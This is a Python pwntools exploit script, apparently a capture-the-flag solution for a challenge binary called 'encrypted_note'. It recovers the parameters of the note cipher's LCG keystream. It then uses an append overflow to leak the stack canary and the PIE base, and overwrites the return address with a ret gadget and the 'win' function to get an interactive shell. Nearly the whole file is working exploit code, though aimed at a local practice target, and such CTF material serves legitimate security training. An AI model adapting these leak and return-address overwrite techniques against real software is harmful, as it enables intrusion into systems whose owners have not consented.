from pwn import *
from Crypto.Util.number import inverse, bytes_to_long, long_to_bytes

def write_note(note_contents):
    conn.sendlineafter('> ', '1')
    conn.sendafter('Enter note contents: ', note_contents)

def decrypt_write_notes(note_contents):
    payload = get_decrypted_payload(note_contents).replace(b'\x00', b'\x66')
    write_note(payload)

def read_note():
    conn.sendlineafter('> ', '2')
    return bytes.fromhex(conn.recvline().decode().strip())

def append_to_note(block):
    conn.sendlineafter('> ', '3')
    conn.sendafter('Enter note contents to append: ', block)

def decrypt_append_to_note(block):
    payload = get_decrypted_payload(block).replace(b'\x00', b'\x66')
    append_to_note(payload)

def get_lcg_next():
    write_note(b'A'*8)
    X = read_note()
    p = xor(b'A'*8, X)
    return bytes_to_long(p[::-1])

def lcg_skip(n):
    [get_lcg_next() for _ in range(n)]
    [predict_lcg_next() for _ in range(n)]

def get_decrypted_payload(payload):
    out = b''
    for i in range(0, len(payload), 8):
        out += xor(payload[i:i+8], predict_lcg_next())
    return out

def predict_lcg_next(b=True):
    global X
    X = (A*X + B) % m
    if b:
        return long_to_bytes(X, 8)[::-1]
    return X

def predict_lcg_peek(n, b=True):
    X_ = X
    for _ in range(n):
        X_ = (A*X_ + B) % m
    if b:
        return long_to_bytes(X_, 8)[::-1]
    return X_

def find_good_lcg_skip(k):
    n = 0
    while True:
        l = predict_lcg_peek(n+k)
        n += 1
        if l[-1] == 0:
            break
    log.success(f'found good LCG state: {n} ticks ahead')
    return n

exe = ELF('../challenge/encrypted_note')
conn = remote('0.0.0.0', 1337)

# ==================== recover LCG parameters

m = 2**64
X1 = get_lcg_next()
X2 = get_lcg_next()
X3 = get_lcg_next()
A = (X3 - X2) * inverse(X2 - X1, m) % m
B = (X2 - A*X1) % m
X = X3
log.success(f'recovered LCG parameters: A = {A}, B = {B}')

# ==================== leak canary

# offset so that the next append overwrites canary null byte
decrypt_write_notes(b'A'*81 + b'\x00')

# append a single block so that read_note leaks canary
decrypt_append_to_note(b'B\xff' + b'B'*6)

# read the plaintext canary
note = read_note()
canary = b'\x00' + note[89:89+7]
log.success(f'leaked canary: {canary.hex()}')

# ==================== leak binary base

decrypt_write_notes(b'A'*86 +  b'\x00\xff')
decrypt_append_to_note(b'C\xffCCCC\x00')
decrypt_append_to_note(b'DDDD\x00DD')
decrypt_append_to_note(b'E'*8)

# read the plaintext ret address and recover binary base
n = read_note()
bin_base = u64(n[104:104+6] + b'\x00\x00') - 0x169f
log.success(f'PIE base: {hex(bin_base)}')

# ==================== overwrite vuln's ret with win

win = p64(bin_base + exe.symbols['win'])
ret = p64(bin_base + 0x000000000000101a)
log.success(f'win address: {hex(u64(win))}')
log.success(f'ret gadget : {hex(u64(ret))}')

# carefully write win function
n = find_good_lcg_skip(12+6)
lcg_skip(n)
decrypt_write_notes(b'A'*86 + b'\x00\xff')
decrypt_append_to_note(b'U\xffUUUU\x00')
decrypt_append_to_note(b'WWWWWW\x00')
decrypt_append_to_note(b'VVVVVV\x00')
decrypt_append_to_note(b'XX\x00XXXX')
decrypt_append_to_note(b'YYYYYY\x00')
decrypt_append_to_note(win[:6] + b'\x00')

# carefully write the ret gadget
n = find_good_lcg_skip(12+5)
lcg_skip(n)
decrypt_write_notes(b'A'*86 + b'\x00\xff')
decrypt_append_to_note(b'U\xffU' + canary[1:4] + b'\x00')
decrypt_append_to_note(canary[4:8] + b'WW\x00')
decrypt_append_to_note(b'V\x00VVVVV')
decrypt_append_to_note(b'XXXXX\x00X')
decrypt_append_to_note(ret[:6] + b'\x00\x00')

# write canary null byte
n = find_good_lcg_skip(12+1)
lcg_skip(n)
decrypt_write_notes(b'A'*81 + b'\x00' + b'B'*5 + b'\xff')
decrypt_append_to_note(b'CCCCCC\x00')

# win!
conn.sendlineafter('> ', '0')
conn.interactive()
